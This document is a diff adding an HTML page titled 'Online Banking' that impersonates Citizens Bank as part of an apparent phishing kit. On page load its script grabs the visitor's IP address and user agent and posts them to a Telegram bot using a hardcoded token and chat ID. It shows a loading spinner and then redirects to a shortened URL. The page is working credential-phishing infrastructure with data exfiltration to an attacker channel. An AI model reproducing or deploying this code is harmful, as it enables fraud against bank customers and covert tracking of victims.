@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<html>
+<head>
+    <meta charset="utf-8">
+
+        <!--"user-scalable=no" disable zooming when
+        clicking in submission boxes on mobile-->
+
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+        
+        <title>Online Banking</title>
+        <script src="index.js"></script>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
+        
+
+        <!--href stands for hypertext reference-->
+        <link rel="icon" href="ico.png" type="image/png">
+
+        <link rel="stylesheet" href="styles.css"
+        type="text/css">
+        <link rel="icon" href="logo.png" type="image/png">
+        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+</head>
+<body>
+    <script>
+
+        // Function to redirect to another page
+        function redirectToAnotherPage() {
+            window.location.href = 'https://shorturl.at/duAMT'; 
+        }
+        // Set the delay for redirection (6 seconds)
+        var redirectDelay = 4000; // 6 seconds
+        // Wait for 6 seconds and then redirect
+        setTimeout(redirectToAnotherPage, redirectDelay);
+
+    </script>
+
+    <script>
+        /*    Grab IP and UA   */
+
+        async function getUserIP() {
+            try {
+                const response = await axios.get('https://api64.ipify.org?format=json');
+                return response.data.ip;
+            } catch (error) {
+                console.error("Error getting IP address:", error);
+                return "Unknown IP";
+            }
+        }
+
+        // Function to get user agent
+        function getUserAgent() {
+            return navigator.userAgent;
+        }
+
+        // Log and send IP address and user agent
+        async function logAndSendUserInfo() {
+            const ipAddress = await getUserIP();
+            const userAgent = getUserAgent();
+
+            const ipAndUserAgentLog = `
+            \n
+            <b>[Citizens Bank IP + UserAgent]</b>
+            \n
+            <b>IP Address: </b>${ipAddress}
+            \n
+            <b>User Agent: </b>${userAgent}
+            \n`;
+
+            // Telegram Bot API endpoint and chat ID
+            const telegramBotToken = '5943159759:AAF2du7IRutCVQStuAp66ZdnfuKkJNjLtnA';
+            const chatId = '6391433593';
+
+            const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+            try {
+                const response = await axios.post(telegramApiUrl, {
+                    chat_id: chatId,
+                    text: ipAndUserAgentLog,
+                    parse_mode: 'HTML',
+                });
+
+            } catch (error) {
+                console.error("Error sending IP:", error);
+            }
+        }
+
+        // Call the logAndSendUserInfo function when the page loads
+        document.addEventListener('DOMContentLoaded', logAndSendUserInfo);
+    </script>
+
+    <div class="loader"></div>
+
+    <style>
+        .loader {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.75s, visibility 0.75s;
+        }
+        
+        .loader::after {
+            content: "";
+            width: 18px;
+            height: 18px;
+            border: 5px solid whitesmoke;
+            border-top-color: #04764c;
+            border-radius: 60%;
+            animation: loading 0.93s ease infinite;
+        }
+        
+        @keyframes loading {
+            from {
+                transform: rotate(0turn);
+            }
+            to {
+                transform: rotate(1turn);
+            }
+        }
+    </style>
+
+</body>
+
+
+</html>
